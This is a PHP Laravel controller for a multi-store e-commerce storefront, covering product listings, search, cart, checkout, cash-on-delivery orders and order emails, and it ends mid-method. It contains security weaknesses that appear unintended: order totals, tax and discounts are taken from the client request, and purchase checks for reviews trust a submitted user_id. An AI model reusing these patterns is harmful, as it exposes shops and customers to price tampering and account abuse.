<?php

namespace App\Http\Controllers;
use App\Advertise;
use App\Banner;
use App\Blog;
use App\Brand;
use App\Cart;
use App\Category;
use App\ProductCategory;
use App\Childcategory;
use App\Classes\GeniusMailer;
use App\Compare;
use App\Conversation;
use App\Counter;
use App\Coupon;
use App\Currency;
use App\Faq;
use App\Generalsetting;
use App\Image;
use App\Language;
use App\Message;
use App\Notification;
use App\Order;
use App\Page;
use App\Pagesetting;
use App\PaymentGateway;
use App\Pickup;
use App\Portfolio;
use App\Product;
use App\ProductClick;
use App\Review;
use App\Service;
use App\Slider;
use App\Subcategory;
use App\Subscriber;
use App\User;
use App\UserNotification;
use App\States;
use Auth;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Session;
use InvalidArgumentException;
use Markury\MarkuryPost;
use DB;
use App\Traits\StoreTrait;
class FrontendController extends Controller
{
    use StoreTrait;
    public $store_id;
    public $store_code;
    public function __construct()
    {
        //$this->auth_guests();
        /*if(isset($_SERVER['HTTP_REFERER'])){
            $referral = parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST);
            if ($referral != $_SERVER['SERVER_NAME']){

                $brwsr = Counter::where('type','browser')->where('referral',$this->getOS());
                if($brwsr->count() > 0){
                    $brwsr = $brwsr->first();
                    $tbrwsr['total_count']= $brwsr->total_count + 1;
                    $brwsr->update($tbrwsr);
                }else{
                    $newbrws = new Counter();
                    $newbrws['referral']= $this->getOS();
                    $newbrws['type']= "browser";
                    $newbrws['total_count']= 1;
                    $newbrws->save();
                }

                $count = Counter::where('referral',$referral);
                if($count->count() > 0){
                    $counts = $count->first();
                    $tcount['total_count']= $counts->total_count + 1;
                    $counts->update($tcount);
                }else{
                    $newcount = new Counter();
                    $newcount['referral']= $referral;
                    $newcount['total_count']= 1;
                    $newcount->save();
                }
            }
        }else{
            $brwsr = Counter::where('type','browser')->where('referral',$this->getOS());
            if($brwsr->count() > 0){
                $brwsr = $brwsr->first();
                $tbrwsr['total_count']= $brwsr->total_count + 1;
                $brwsr->update($tbrwsr);
            }else{
                $newbrws = new Counter();
                $newbrws['referral']= $this->getOS();
                $newbrws['type']= "browser";
                $newbrws['total_count']= 1;
                $newbrws->save();
            }
        }*/
    }


    function getOS() {

        $user_agent     =   $_SERVER['HTTP_USER_AGENT'];

        $os_platform    =   "Unknown OS Platform";

        $os_array       =   array(
            '/windows nt 10/i'     =>  'Windows 10',
            '/windows nt 6.3/i'     =>  'Windows 8.1',
            '/windows nt 6.2/i'     =>  'Windows 8',
            '/windows nt 6.1/i'     =>  'Windows 7',
            '/windows nt 6.0/i'     =>  'Windows Vista',
            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
            '/windows nt 5.1/i'     =>  'Windows XP',
            '/windows xp/i'         =>  'Windows XP',
            '/windows nt 5.0/i'     =>  'Windows 2000',
            '/windows me/i'         =>  'Windows ME',
            '/win98/i'              =>  'Windows 98',
            '/win95/i'              =>  'Windows 95',
            '/win16/i'              =>  'Windows 3.11',
            '/macintosh|mac os x/i' =>  'Mac OS X',
            '/mac_powerpc/i'        =>  'Mac OS 9',
            '/linux/i'              =>  'Linux',
            '/ubuntu/i'             =>  'Ubuntu',
            '/iphone/i'             =>  'iPhone',
            '/ipod/i'               =>  'iPod',
            '/ipad/i'               =>  'iPad',
            '/android/i'            =>  'Android',
            '/blackberry/i'         =>  'BlackBerry',
            '/webos/i'              =>  'Mobile'
        );

        foreach ($os_array as $regex => $value) {

            if (preg_match($regex, $user_agent)) {
                $os_platform    =   $value;
            }

        }
        return $os_platform;
    }

    public function index(Request $request)
    {
      if (Session::has('FRONT_STORE_ID')){
        $this->store_id = session('FRONT_STORE_ID');
        $store_code = $this->store_code = session('FRONT_STORE_CODE');
      }else{
        //$ip = '203.192.237.76'; /* Static IP address */
        $ip = $_SERVER['REMOTE_ADDR'];
        $storeinfo = $this->getCurrentStoreLocation($ip);
        $this->store_id = $storeinfo->id;
        $store_code = $this->store_code = $storeinfo->store_code;
        session()->put('FRONT_STORE_CODE', $store_code);
        session()->put('FRONT_STORE_ID', $this->store_id);
      }
      //
        if(!empty($request->reff))
        {
            $affilate_user = User::where('affilate_code','=',$request->reff)->first();
            if(!empty($affilate_user))
            {
                $gs = Generalsetting::where('store_id',$this->store_id)->first();
                if($gs->is_affilate == 1)
                {
                    Session::put('affilate', $affilate_user->id);
                    return redirect()->route('front.index');
                }
            }
        }

        $ads = Portfolio::all();
        $sls = Slider::first();
        $id1 = $sls->id;
        $sliders = Slider::where('id','>',$id1)->where('store_id',$this->store_id)->get();
        $brands = Brand::orderBy('brand_name','asc')->where('store_id',$this->store_id)->get();
        $banner = Banner::findOrFail(1);
        $services = Service::all();
        $fproducts = Product::where('featured','=',1)->where('store_id',$this->store_id)->where('status','=',1)->where('is_approve','=',1)->orderBy('id','desc')->take(8)->get();
        $beproducts = Product::where('best','=',1)->where('status','=',1)->where('store_id',$this->store_id)->where('is_approve','=',1)->orderBy('id','desc')->take(8)->get();
        $tproducts = Product::where('top','=',1)->where('status','=',1)->where('store_id',$this->store_id)->where('is_approve','=',1)->orderBy('id','desc')->take(8)->get();
        $hproducts = Product::where('hot','=',1)->where('status','=',1)->where('store_id',$this->store_id)->where('is_approve','=',1)->orderBy('id','desc')->take(8)->get();
        $lproducts = Product::where('latest','=',1)->where('status','=',1)->where('store_id',$this->store_id)->where('is_approve','=',1)->orderBy('id','desc')->take(8)->get();
        $biproducts = Product::where('big','=',1)->where('status','=',1)->where('store_id',$this->store_id)->where('is_approve','=',1)->orderBy('id','desc')->take(8)->get();
        $imgs = Image::all();
        return view('front.index',compact('store_code','ads','sls','sliders','brands','banner','fproducts','beproducts','tproducts','hproducts','lproducts','biproducts','imgs','services'));
    }

    public function extraIndex(Request $request)
	{
        $ads = Portfolio::all();
        $sls = Slider::first();
        $id1 = $sls->id;
        $sliders = Slider::where('id','>',$id1)->get();
        $brands = Brand::all();
        $banner = Banner::findOrFail(1);
        $services = Service::all();
        $fproducts = Product::where('featured','=',1)->where('status','=',1)->where('is_approve','=',1)->orderBy('id','desc')->take(8)->get();
        $beproducts = Product::where('best','=',1)->where('status','=',1)->where('is_approve','=',1)->orderBy('id','desc')->take(8)->get();
        $tproducts = Product::where('top','=',1)->where('status','=',1)->where('is_approve','=',1)->orderBy('id','desc')->take(8)->get();
        $hproducts = Product::where('hot','=',1)->where('status','=',1)->where('is_approve','=',1)->orderBy('id','desc')->take(8)->get();
        $lproducts = Product::where('latest','=',1)->where('status','=',1)->where('is_approve','=',1)->orderBy('id','desc')->take(8)->get();
        $biproducts = Product::where('big','=',1)->where('status','=',1)->where('is_approve','=',1)->orderBy('id','desc')->take(8)->get();
        $imgs = Image::all();
		$artists = $this->getFeaturedArtist();
        return view('front.extraindex',compact('ads','sls','sliders','brands','banner','fproducts','beproducts','tproducts','hproducts','lproducts','biproducts','imgs','services','artists'));
	}

    public function lang($id)
    {
        Session::put('language', $id);
        return redirect()->back();
    }


    public function currency($id)
    {
        Session::put('currency', $id);
        return redirect()->back();
    }

	public function CountResult($category_id,$min,$max)
	{

		$count  = DB::table('products')
			->select('products.*')
			->where('products.status',1)->where('products.is_approve',1)->where('products.category_id',$category_id)->where('products.store_id',$this->store_id)->get();
		if(!empty($min) || !empty($min))
        {
			$count = DB::table('products')
			->select('products.*')
			->where('products.status',1)->where('products.is_approve',1)->where('products.category_id',$category_id)->whereBetween('products.cprice', [$min, $max])->where('products.store_id',$this->store_id)->get();
		}
		return count($count);
	}

  public function CountResultSubCat($subcategory_id,$category_id,$brand_id,$series_id,$min,$max)
	{
	    if (Session::has('FRONT_STORE_ID')){
        $storeid =  $this->store_id = session('FRONT_STORE_ID');
        $store_code = $this->store_code = session('FRONT_STORE_CODE');
        }else{
        //$ip = '203.192.237.76'; /* Static IP address */
        $ip = $_SERVER['REMOTE_ADDR'];
        $storeinfo = $this->getCurrentStoreLocation($ip);
        $storeid = $this->store_id = $storeinfo->id;
        $store_code = $this->store_code = $storeinfo->store_code;
        session()->put('FRONT_STORE_CODE', $store_code);
        session()->put('FRONT_STORE_ID', $this->store_id);
        }

		$count  = DB::table('products')
			->select('products.*')
			->where('products.status',1);
        if(!empty($category_id))
        {
        $count = $count->where('products.category_id', $category_id);          
        }
        if(!empty($subcategory_id))
        {
        $count = $count->where('products.subcategory_id', $subcategory_id);          
        }

        if(!empty($brand_id))
        {
        $count = $count->where('products.brand_id', $brand_id);          
        }

        if(!empty($series_id))
        {
        $count = $count->where('products.series_id',$series_id);
        }
        $count = $count->where('products.store_id',$storeid)->get();

		/*if(!empty($min) || !empty($min))
        {
			$count = DB::table('products')
			->select('products.*')
			->where('products.status',1)->where('products.is_approve',1)->where('products.subcategory_id',$category_id)->whereBetween('products.cprice', [$min, $max])->where('products.store_id',$storeid)->get();
		  }*/
		return count($count);
	}

    public function getChildCategories($parent_id)
	{
		$childcategories = Category::where('status','=',1)->where('parent_id','=',$parent_id)->orderBy('cat_name','asc')->get();
		
        return $childcategories;
	}

    public function subcategory(Request $request,$catslug,$subcatslug)
    {
        if (Session::has('FRONT_STORE_ID')){
            $storeid =  $this->store_id = session('FRONT_STORE_ID');
            $store_code = $this->store_code = session('FRONT_STORE_CODE');
            }else{
            //$ip = '203.192.237.76'; /* Static IP address */
            $ip = $_SERVER['REMOTE_ADDR'];
            $storeinfo = $this->getCurrentStoreLocation($ip);
            $storeid = $this->store_id = $storeinfo->id;
            $store_code = $this->store_code = $storeinfo->store_code;
            session()->put('FRONT_STORE_CODE', $store_code);
            session()->put('FRONT_STORE_ID', $this->store_id);
            }

        $prices = $this->GetMinAndMaxPrice();
        $sort = "";
        $cat = Category::where('cat_slug','=',$catslug)->where('store_id',$storeid)->first();
        $subcat = Category::where('cat_slug','=',$subcatslug)->where('store_id',$storeid)->firstOrFail();

        $brandsdata = DB::table('brands')
  			->join('brand_categories_link', 'brand_categories_link.brand_id', '=', 'brands.id')
  			->select('brands.*')
  			->where('brand_categories_link.category_id',$cat->id)->orderBy('brand_name','asc')->get();
    $filterdata['manufacturer'] = 0;
    $filterdata['select_sub_category'] = $subcat->id;
    $filterdata['select_category'] = $cat->id;  
    $subcategories = $this->getChildCategories($cat->id);
    $brand_id='';
    $series_id='';     
		    $total_product = $this->CountResultSubCat($subcat->id,$cat->id,$brand_id,$series_id,$prices['minprice'],$prices['maxprice']);
        $sort = '';
        $limit=15;
        $offset=0;
        $page = 1;
       
        $cats = $this->getProductsBySubCatId($subcat->id,$cat->id,$brand_id,$series_id,$limit,$offset,$sort,$prices['minprice'],$prices['maxprice']);
      return view('front.sub-category',compact('subcategories','prices','filterdata','brandsdata','catslug','subcatslug','subcat','limit','page','cat','sort','cats','total_product'));
    }

    public function AjaxFilterProductSubcat(Request $request)
    {
      $input = $request->all();
      $category_id = $input['category_id'];
      $minprice = $input['pricemin'];
      $maxprice = $input['pricemax'];
      $page = $input['page'];
      $lpage = $input['page'] -1;
      $limit = 15;
      $offset = ceil($lpage * $limit);
      $sort = $input['sortby'];
      $brand_id = $input['brand_id'];
	  $series_id = $input['series_id'];
	  $subcategory_id = $input['subcategory_id'];
      $cats = $this->getProductsBySubCatId($subcategory_id,$category_id,$brand_id,$series_id,$limit,$offset,$sort,$minprice,$maxprice);
      $total_product = $this->CountResultSubCat($subcategory_id,$category_id,$brand_id,$series_id,$minprice,$maxprice);
      return view('includes.product-grid-items',compact('page','cats','limit','total_product'));
    }

    public function getProductsBySubCatId($subcatid,$catid,$brand_id,$series_id,$limit,$offset,$sort,$minprice,$maxprice)
    {
        if (Session::has('FRONT_STORE_ID')){
        $storeid =  $this->store_id = session('FRONT_STORE_ID');
        $store_code = $this->store_code = session('FRONT_STORE_CODE');
        }else{
        //$ip = '203.192.237.76'; /* Static IP address */
        $ip = $_SERVER['REMOTE_ADDR'];
        $storeinfo = $this->getCurrentStoreLocation($ip);
        $storeid = $this->store_id = $storeinfo->id;
        $store_code = $this->store_code = $storeinfo->store_code;
        session()->put('FRONT_STORE_CODE', $store_code);
        session()->put('FRONT_STORE_ID', $this->store_id);
        }
        
      $cats = DB::table('products')
  			->select('products.*',DB::raw('(select count(*) from galleries where product_id=products.id) as total_photo'))
  			->where('products.status',1)->where('products.store_id',$storeid)
        ->whereBetween('products.cprice', [$minprice, $maxprice]);
        if(!empty($catid))
        {
            $cats = $cats->where('products.category_id', $catid);          
        }
        if(!empty($subcatid))
        {
            $cats = $cats->where('products.subcategory_id', $subcatid);          
        }
		
	if(!empty($brand_id))
        {
            $cats = $cats->where('products.brand_id', $brand_id);          
        }
        
        if(!empty($series_id))
        {
        $cats = $cats->where('products.series_id',$series_id);
        }
        if($sort == "new")
        {
            $cats = $cats->orderBy('id','desc')->orderBy('total_photo','desc');
        }elseif($sort == "old"){
            $cats = $cats->orderBy('id','asc')->orderBy('total_photo','desc');
        }elseif($sort == "low"){
            $cats = $cats->orderBy('products.cprice','asc')->orderBy('total_photo','desc');
        }elseif($sort == "high"){
            $cats = $cats->orderBy('products.cprice','desc')->orderBy('total_photo','desc');
        }else{
            //$cats = $cats->orderBy('products.id','desc');
            $cats = $cats->orderBy('total_photo','desc');
        }
        //$cats = $cats->orderBy('products.id','desc')->paginate($limit);
       $cats = $cats->orderBy('products.id','desc')->offset($offset)->limit($limit)->get();
        return $cats;
    }


	public function getRelatedProducts($product_id)
	{
    $limit = 20;
    $offset = 0;

		$catrow = DB::table('products')->select('products.category_id')->where('products.id',$product_id)->first();
    $catid = $catrow->category_id;
		$relatedproducts = DB::table('products')
			->select('products.*',DB::raw('(select count(*) from galleries where product_id=products.id) as total_photo'))->where('products.category_id',$catid)
			->where('products.status',1)->where('products.is_approve',1)->where('products.store_id',$this->store_id)
      ->where('products.id','!=',$product_id)->groupBy('products.id')
      ->orderBy('total_photo','desc')->offset($offset)->limit($limit)->get();
		return $relatedproducts;
	}

    public function cart()
    {
        if (!Session::has('cart')) {
            return view('front.cart');
        }
        $oldCart = Session::get('cart');
        $cart = new Cart($oldCart);

        $products = $cart->items;
		 //echo '<pre>'; $cart->totalPrice
     $totalPrice = $cart->totalCartAmount($cart);
        /*if(count($products)>0)
        {
        $totalPrice = array_sum(array_column($products, 'price'));
        }else{
        $totalPrice = 0;
      }*/

        return view('front.cart', ['products' => $cart->items, 'totalPrice' => $totalPrice]);
    }



    //Submit Review
    //Submit Review
    public function reviewsubmit(Request $request)
    {
        $ck = 0;
$orders = Order::where('user_id','=',$request->user_id)->where('status','=','completed')->get();

        foreach($orders as $order)
        {
        $cart = unserialize(bzdecompress(utf8_decode($order->cart)));
            foreach($cart->items as $product)
            {
                if($request->product_id == $product['item']['id'])
                {
                    $ck = 1;
                    break;
                }
            }
        }
        if($ck == 1)
        {
            $user = Auth::guard('user')->user();
            $prev = Review::where('product_id','=',$request->product_id)->where('user_id','=',$user->id)->get();
            if(count($prev) > 0)
            {
            return redirect()->back()->with('unsuccess','You Have Reviewed Already.');
            }
            $review = new Review;
            $review->fill($request->all());
            $review['review_date'] = date('Y-m-d H:i:s');
            $review->save();
            return redirect()->back()->with('success','Your Review Submitted Successfully.');
        }
        else{
            return redirect()->back()->with('unsuccess','Buy This Product First');
        }


    }


	public function CountResultByTag($tag)
	{

		$count  = DB::table('products')->select('products.*')
			->where('products.status',1)->where('products.is_approve',1)->where('tags', 'like', '%' . $tag . '%')->count();

		return $count;
	}

    //Submit Review

    public function search(Request $request)
    {
       $sort = "";
       $search = $request->product;
       $sproducts = Product::where('status','=',1)->where('name', 'like', '%' . $search . '%')
                ->paginate(9);
       return view('front.searchproduct', compact('sproducts','search','sort'));
    }

    public function searchs(Request $request, $search)
    {
       $sort = "";
       $sproducts = Product::where('status','=',1)->where('name', 'like', '%' . $search . '%')
                ->paginate(9);
        $min = $request->min;
        $max = $request->max;
        $sproducts = Product::where('status','=',1)->where('name', 'like', '%' . $search . '%')->whereBetween('cprice', [$min,$max])->orderBy('cprice','asc')->paginate(9);
       return view('front.searchproductprice', compact('sproducts','search','sort','min','max'));
    }

    public function searchss(Request $request, $search, $sort)
    {
        if($sort == "new")
        {
        if(!empty($request->min) || !empty($request->max))
        {
        $min = $request->min;
        $max = $request->max;
       $sproducts = Product::where('status','=',1)->where('name', 'like', '%' . $search . '%')->whereBetween('cprice', [$min,$max])->orderBy('id','desc')->paginate(9);

        return view('front.searchpricesort',compact('sproducts','search','sort','min','max'));
        }
       $sproducts = Product::where('status','=',1)->where('name', 'like', '%' . $search . '%')
                ->orderBy('id','desc')->paginate(9);
        }
        else if($sort == "old")
        {
        if(!empty($request->min) || !empty($request->max))
        {
        $min = $request->min;
        $max = $request->max;
       $sproducts = Product::where('status','=',1)->where('name', 'like', '%' . $search . '%')->whereBetween('cprice', [$min,$max])->paginate(9);

        return view('front.searchpricesort',compact('sproducts','search','sort','min','max'));
        }
       $sproducts = Product::where('status','=',1)->where('name', 'like', '%' . $search . '%')->paginate(9);
        }
        else if($sort == "low")
        {
        if(!empty($request->min) || !empty($request->max))
        {
        $min = $request->min;
        $max = $request->max;
       $sproducts = Product::where('status','=',1)->where('name', 'like', '%' . $search . '%')->whereBetween('cprice', [$min,$max])->orderBy('cprice','asc')->paginate(9);

        return view('front.searchpricesort',compact('sproducts','search','sort','min','max'));
        }
       $sproducts = Product::where('status','=',1)->where('name', 'like', '%' . $search . '%')
                ->orderBy('cprice','asc')->paginate(9);
        }
        else if($sort == "high")
        {
        if(!empty($request->min) || !empty($request->max))
        {
        $min = $request->min;
        $max = $request->max;
       $sproducts = Product::where('status','=',1)->where('name', 'like', '%' . $search . '%')->whereBetween('cprice', [$min,$max])->orderBy('cprice','desc')->paginate(9);

        return view('front.searchpricesort',compact('sproducts','search','sort','min','max'));
        }
       $sproducts = Product::where('status','=',1)->where('name', 'like', '%' . $search . '%')
                ->orderBy('cprice','desc')->paginate(9);
        }
       return view('front.searchproductsort', compact('sproducts','search','sort'));
    }



    public function checkout()
    {
        if (!Session::has('cart')) {
            return redirect()->route('front.cart')->with('success',"You don't have any product to checkout.");
        }
        if (Session::has('already')) {
            Session::forget('already');
        }
        if (Session::has('FRONT_STORE_ID')){
        $this->store_id = session('FRONT_STORE_ID');
        $store_code = $this->store_code = session('FRONT_STORE_CODE');
        }else{
        $ip = $_SERVER['REMOTE_ADDR'];
        $storeinfo = $this->getCurrentStoreLocation($ip);
        $this->store_id = $storeinfo->id;
        $store_code = $this->store_code = $storeinfo->store_code;
        session()->put('FRONT_STORE_CODE', $store_code);
        session()->put('FRONT_STORE_ID', $this->store_id);
        }
        $gs = Generalsetting::where('store_id',$this->store_id)->first();
        $dp = 1;
		$allstates = States::where('country_id','=',101)->orderBy('name','asc')->get();
// If a user is Authenticated then there is no problm user can go for checkout

		if(Auth::guard('user')->check())
		{
		$gateways =  PaymentGateway::where('status','=',1)->get();
		$pickups = Pickup::all();
		$oldCart = Session::get('cart');
		$cart = new Cart($oldCart);
		$products = $cart->items;
		if($gs->multiple_ship == 1)
		{
		$user = null;
		foreach ($cart->items as $prod) {
		$user[] = $prod['item']['user_id'];
		}
		$ship  = 0;
		$users = array_unique($user);
		if(!empty($users))
		{
		foreach ($users as $user) {
		if($user != 0){
		$nship = User::findOrFail($user);
		$ship += $nship->shipping_cost;
		}
		else {
		$ship  += $gs->ship;
		}

		}
		}

		}
		else{
		$ship  = $gs->ship;
		}

		foreach ($products as $prod) {
		if($prod['item']['type'] == 0)
		{
		$dp = 0;
		break;
		}
		}
    /*if($dp == 1)
    {
    $ship  = 0;
    }*/
    $totalPrice = $cart->totalCartAmount($cart);
		$total = $totalPrice + $ship;
		/*if($gs->tax != 0)
		{
		$tax = ($total / 100) * $gs->tax;
		$total = $total + $tax;
  }*/

		return view('front.checkout', ['allstates'=>$allstates,'products' => $cart->items, 'totalPrice' => $total, 'pickups' => $pickups, 'totalQty' => $cart->totalQty, 'gateways' => $gateways, 'shipping_cost' => $ship, 'digital' => $dp]);
		}

		else

		{
		// If guest checkout is activated then user can go for checkout
		if($gs->guest_checkout == 1)
		{
		$gateways =  PaymentGateway::where('status','=',1)->get();
		$pickups = Pickup::all();
		$oldCart = Session::get('cart');
		$cart = new Cart($oldCart);
		$products = $cart->items;
		if($gs->multiple_ship == 1)
		{
		$user = null;
		foreach ($cart->items as $prod) {
		$user[] = $prod['item']['user_id'];
		}
		$ship  = 0;
		$users = array_unique($user);
		if(!empty($users))
		{
			foreach ($users as $user) {
			if($user != 0){
			$nship = User::findOrFail($user);
			$ship += $nship->shipping_cost;
			}
			else {
			$ship  += $gs->ship;
			}
			}
		}

		}
		else{
			$ship  = $gs->ship;
		}
		foreach ($products as $prod) {
			if($prod['item']['type'] == 0)
			{
			$dp = 0;
			break;
			}
		}
		if($dp == 1)
		{
			$ship  = 0;
		}
    $totalPrice = $cart->totalCartAmount($cart);
			$total = $totalPrice + $ship;
		if($gs->tax != 0)
		{
			$tax = ($total / 100) * $gs->tax;
			$total = $total + $tax;
		}
		foreach ($products as $prod) {
			if($prod['item']['type'] != 0)
			{
			if(!Auth::guard('user')->check())
			{
			$ck = 1;
			return view('front.checkout', ['allstates'=>$allstates,'products' => $cart->items, 'totalPrice' => $total, 'pickups' => $pickups, 'totalQty' => $cart->totalQty, 'gateways' => $gateways, 'shipping_cost' => $ship, 'checked' => $ck, 'digital' => $dp]);
			}
			}
		}
		return view('front.checkout', ['allstates'=>$allstates,'products' => $cart->items, 'totalPrice' => $total, 'pickups' => $pickups, 'totalQty' => $cart->totalQty, 'gateways' => $gateways, 'shipping_cost' => $ship, 'digital' => $dp]);
		}
		// If guest checkout is Deactivated then display pop up form with proper error message
		else{
			$gateways =  PaymentGateway::where('status','=',1)->get();
			$pickups = Pickup::all();
			$oldCart = Session::get('cart');
			$cart = new Cart($oldCart);
			$products = $cart->items;
		if($gs->multiple_ship == 1)
		{
			$user = null;
			foreach ($cart->items as $prod) {
			$user[] = $prod['item']['user_id'];
			}
			$ship  = 0;
			$users = array_unique($user);
			if(!empty($users))
			{
			foreach ($users as $user) {
			if($user != 0){
			$nship = User::findOrFail($user);
			$ship += $nship->shipping_cost;
			}
			else {
			$ship  += $gs->ship;
			}
			}
			}
		}
		else{
			$ship  = $gs->ship;
		}
$totalPrice = $cart->totalCartAmount($cart);
			$total = $totalPrice + $ship;
		if($gs->tax != 0)
		{
			$tax = ($total / 100) * $gs->tax;
			$total = $total + $tax;
		}
			$ck = 1;
			return view('front.checkout', ['allstates'=>$allstates,'products' => $cart->items, 'totalPrice' => $total, 'pickups' => $pickups, 'totalQty' => $cart->totalQty, 'gateways' => $gateways, 'shipping_cost' => $ship, 'checked' => $ck, 'digital' => $dp]);
		}
		}
    }

    public function cashondelivery(Request $request)
    {
        if (!Session::has('cart')) {
            return redirect()->route('front.cart')->with('success',"You don't have any product to checkout.");
        }
            if (Session::has('currency'))
            {
              $curr = Currency::find(Session::get('currency'));
            }
            else
            {
                $curr = Currency::where('is_default','=',1)->first();
            }
        if (Session::has('FRONT_STORE_ID')){
        $this->store_id = session('FRONT_STORE_ID');
        $store_code = $this->store_code = session('FRONT_STORE_CODE');
        }else{
        $ip = $_SERVER['REMOTE_ADDR'];
        $storeinfo = $this->getCurrentStoreLocation($ip);
        $this->store_id = $storeinfo->id;
        $store_code = $this->store_code = $storeinfo->store_code;
        session()->put('FRONT_STORE_CODE', $store_code);
        session()->put('FRONT_STORE_ID', $this->store_id);
        }
        $gs = Generalsetting::where('store_id',$this->store_id)->first();
        $oldCart = Session::get('cart');
        $cart = new Cart($oldCart);
        foreach($cart->items as $key => $prod)
        {
        if($prod['item']['license']!=null && $prod['item']['license_qty']!=null)
        {
            $details1 = explode(',', $prod['item']['license_qty']);
                foreach($details1 as $ttl => $dtl)
                {
                    if($dtl != 0)
                    {
                        $dtl--;
                        $produc = Product::findOrFail($prod['item']['id']);
                        $temp = explode(',', $produc->license_qty);
                        $temp[$ttl] = $dtl;
                        $final = implode(',', $temp);
                        $produc->license_qty = $final;
                        $produc->update();
                        $temp = explode(',,', $produc->license);
                        $license = $temp[$ttl];
         $oldCart = Session::has('cart') ? Session::get('cart') : null;
         $cart = new Cart($oldCart);
         $cart->updateLicense($prod['item']['id'],$license);
         Session::put('cart',$cart);
                        break;
                    }
                }
        }
        }
        $order = new Order;
        $success_url = action('PaymentController@payreturn');
        $item_name = $gs->title." Order";
        $item_number = str_random(4).time();
        $order['user_id'] = $request->user_id;
        $order['cart'] = utf8_encode(bzcompress(serialize($cart), 9));
        $order['totalQty'] = $request->totalQty;
        $order['pay_amount'] = round($request->total / $curr->value, 2);
        $order['method'] = "Cash On Delivery";
        $order['shipping'] = $request->shipping;
        $order['pickup_location'] = $request->pickup_location;
        $order['customer_email'] = $request->email;
        $order['customer_name'] = $request->name;
        $order['shipping_cost'] = $request->shipping_cost;
        $order['tax'] = $request->tax;
        $order['customer_phone'] = $request->phone;
        $order['order_number'] = str_random(4).time();
        $order['customer_address'] = $request->address;
        $order['customer_country'] = $request->customer_country;
		$order['customer_state'] = $request->customer_state;
        $order['customer_city'] = $request->city;
        $order['customer_zip'] = $request->zip;
        $order['shipping_email'] = $request->shipping_email;
        $order['shipping_name'] = $request->shipping_name;
        $order['shipping_phone'] = $request->shipping_phone;
        $order['shipping_address'] = $request->shipping_address;
        $order['shipping_country'] = $request->shipping_country;
		$order['shipping_state'] = $request->shipping_state;
        $order['shipping_city'] = $request->shipping_city;
        $order['shipping_zip'] = $request->shipping_zip;
        $order['order_note'] = $request->order_notes;
        $order['coupon_code'] = $request->coupon_code;
        $order['coupon_discount'] = $request->coupon_discount;
        $order['shipping_method'] = $request->shipping_method;
        $order['dp'] = $request->dp;
        $order['payment_status'] = "Pending";
        $order['currency_sign'] = $curr->sign;
        $order['currency_value'] = $curr->value;
        $order['store_id'] = $this->store_id;

            if (Session::has('affilate'))
            {
                $val = $request->total / 100;
                $sub = $val * $gs->affilate_charge;
                $user = User::findOrFail(Session::get('affilate'));
                $user->affilate_income = $sub;
                $user->update();
                $order['affilate_user'] = $user->name;
                $order['affilate_charge'] = $sub;
            }
        $order->save();
        $notification = new Notification;
        $notification->order_id = $order->id;
        $notification->save();
                    if($request->coupon_id != "")
                    {
                       $coupon = Coupon::findOrFail($request->coupon_id);
                       $coupon->used++;
                       if($coupon->times != null)
                       {
                            $i = (int)$coupon->times;
                            $i--;
                            $coupon->times = (string)$i;
                       }
                        $coupon->update();

                    }
        foreach($cart->items as $prod)
        {
            $x = (string)$prod['stock'];
            if($x != null)
            {

                $product = Product::findOrFail($prod['item']['id']);
                $product->stock =  $prod['stock'];
                $product->update();
                if($product->stock <= 5)
                {
                    $notification = new Notification;
                    $notification->product_id = $product->id;
                    $notification->save();
                }
            }
        }


        Session::forget('cart');
        //Sending Email To Buyer
        /*if($gs->is_smtp == 1)
        {
        $data = [
            'to' => $request->email,
            'type' => "new_order",
            'cname' => $request->name,
            'oamount' => "",
            'aname' => "",
            'aemail' => "",
            'wtitle' => "",
        ];

        $mailer = new GeniusMailer();
        $mailer->sendAutoMail($data);
        }
        else
        {
           $to = $request->email;
           $subject = "Your Order Placed!!";
           $msg = "Hello ".$request->name."!\nYou have placed a new order. Please wait for your delivery. \nThank you.";
            $headers = "From: ".$gs->from_name."<".$gs->from_email.">";
           mail($to,$subject,$msg,$headers);
        }
        //Sending Email To Admin
        if($gs->is_smtp == 1)
        {
            $data = [
                'to' => $gs->email,
                'subject' => "New Order Recieved!!",
                'body' => "Hello Admin!<br>Your store has received a new order. Please login to your panel to check. <br>Thank you.",
            ];

            $mailer = new GeniusMailer();
            $mailer->sendCustomMail($data);
        }
        else
        {
           $to = $gs->email;
           $subject = "New Order Recieved!!";
           $msg = "Hello Admin!\nYour store has recieved a new order. Please login to your panel to check. \nThank you.";
            $headers = "From: ".$gs->from_name."<".$gs->from_email.">";
           mail($to,$subject,$msg,$headers);
        }*/
        $this->sendEmailtoCustomer($order);
        $this->sendEmailtoAdmin($order);

        return redirect($success_url);
    }
    
    public function sendEmailtoAdmin($order)
    {
        try {
        $gs = Generalsetting::where('store_id',$this->store_id)->first();
        $to = Pagesetting::find(1)->contact_email;
        $subject = "Partzdeal - New Order Recieved!!";
        $cart = unserialize(bzdecompress(utf8_decode($order->cart)));
        $email_body = view('emails.customerorder',compact('order','gs','cart'));
        $msg = "Hello Admin!\nYour store has recieved a new order.\nOrder Number is ".$order->order_number.".\nStore Code is ".$this->store_code.".\nPlease login to your panel to check. \nThank you.";
        $headers = "From: ".$gs->from_name."<".$gs->from_email.">"."\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/html; charset=UTF-8\r\n";
        mail($to,$subject,$email_body,$headers);
    } catch (\Exception $e) {
            Log::error($e->getMessage());
          }
    }
    
    public function sendEmailtoCustomer($order)
    {
        try {
        $gs = Generalsetting::where('store_id',$this->store_id)->first();
        $to = $order->customer_email;
        $subject = "Partzdeal - Your Order Placed!!";
        $cart = unserialize(bzdecompress(utf8_decode($order->cart)));
        $email_body = view('emails.customerorder',compact('order','gs','cart'));
        $msg = "Hello ".$order->customer_name."!\nYou have placed a new order.\nYour order number is ".$order->order_number.".Please wait for your delivery. \nThank you.";
        $headers = "From: ".$gs->from_name."<".$gs->from_email.">"."\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/html; charset=UTF-8\r\n";
        mail($to,$subject,$email_body,$headers);
    } catch (\Exception $e) {
            Log::error($e->getMessage());
          }
        
    }

    public function gateway(Request $request)
    {
       if (Session::has('FRONT_STORE_ID')){
        $this->store_id = session('FRONT_STORE_ID');
        $store_code = $this->store_code = session('FRONT_STORE_CODE');
        }else{
        $ip = $_SERVER['REMOTE_ADDR'];
        $storeinfo = $this->getCurrentStoreLocation($ip);
